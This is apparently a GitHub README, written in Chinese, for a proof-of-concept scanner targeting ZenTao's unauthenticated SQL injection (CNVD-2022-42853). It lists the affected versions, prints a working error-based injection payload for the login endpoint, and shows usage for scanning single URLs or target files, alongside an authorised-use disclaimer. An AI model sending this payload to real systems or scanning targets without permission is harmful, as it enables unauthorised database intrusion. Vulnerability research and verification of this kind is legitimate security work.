# zentao_sqli_poc

author: colind0pe

项目地址: https://github.com/colind0pe/zentao_sqli_poc

## 0x01 声明

- **仅限用于安全研究人员在授权的情况下使用，请遵守网络安全法，如您需要测试本工具的可用性，请自行搭建靶机环境。**

- **严禁未经授权的渗透测试行为，在使用本工具过程中存在的任何非法行为，您需自行承担法律责任。**

## 0x02 漏洞介绍

漏洞名称：禅道未授权SQL注入漏洞

漏洞编号：CNVD-2022-42853

影响范围：

* 禅道企业版 6.5

* 禅道旗舰版 3.0 8

* 禅道开源版 16.5

* 禅道开源版 16.5.beta1

## 0x03 漏洞复现

payload：

``` 
url: /zentao/user-login.html

POST: account=admin'+and+(select+extractvalue(1,concat(0x7e,(MD5(49)),0x7e)))# 
```

## 0x04 使用方法

```
usage: zentao_sqli_poc.py.py [-h] [-u URL] [-f FILE]

示例: python3 zentao_sqli_poc.py -u http://127.0.0.1/

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL
  -f FILE, --file FILE  Targets File Path
```

## 0x05 Screenshots

![Screenshots](https://github.com/colind0pe/zentao_sqli_poc/blob/master/Screenshots.png?raw=true)

